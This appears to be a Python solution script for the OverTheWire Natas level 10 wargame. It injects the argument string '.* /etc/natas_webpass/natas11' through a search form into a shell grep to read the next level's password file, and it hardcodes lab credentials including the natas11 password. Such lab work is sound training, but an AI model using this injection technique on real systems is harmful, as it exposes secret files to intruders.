# natas10

import requests
from pwn import log
from bs4 import BeautifulSoup
import re

url = 'http://natas10.natas.labs.overthewire.org'
username = "natas10"
password = "t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu"
auth = (username, password)
rce = '.* /etc/natas_webpass/natas11'
def exploit():
    params = {
        'needle': rce,
        'submit': 'Search'
    }

    res = requests.get(url, params=params, auth=auth)
    soup = BeautifulSoup(res.text, 'html.parser')
    try:
        pre = soup.find('pre')
        flag = re.findall('.*natas11.*', pre.text)
        log.info(flag)
    except:
        log.error("pre not found")
        exit(1)

if __name__ == '__main__':
    exploit()
    
# natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk